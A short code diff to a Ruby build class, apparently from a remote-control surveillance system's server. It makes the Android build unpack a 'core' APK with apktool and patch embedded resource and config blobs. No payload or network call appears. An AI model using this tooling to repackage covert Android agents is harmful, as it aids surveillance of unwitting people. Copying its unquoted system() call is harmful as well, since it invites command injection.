@@ -5,6 +5,8 @@
 # from RCS::Common
 require 'rcs-common/trace'
 
+require 'find'
+
 module RCS
 module DB
 
@@ -15,14 +17,27 @@ class BuildAndroid < Build
     @platform = 'android'
   end
 
+  def unpack
+    super
+
+    trace :debug, "Build: apktool extract: #{@tmpdir}/apk"
+
+    apktool = File.join @tmpdir, 'apktool.jar'
+    core = File.join @tmpdir, 'core'
+
+    system "java -jar #{apktool} d #{core} #{@tmpdir}/apk"
+
+    @outputs << ['apk/res/raw/resources.bin', 'apk/res/raw/config.bin']
+  end
+
   def patch(params)
 
     trace :debug, "Build: patching: #{params}"
 
     # add the file to be patched to the params
     # these params will be passed to the super
-    params[:core] = 'core'
-    params[:config] = 'config'
+    params[:core] = 'apk/res/raw/resources.bin'
+    params[:config] = 'apk/res/raw/config.bin'
 
     # invoke the generic patch method with the new params
     super
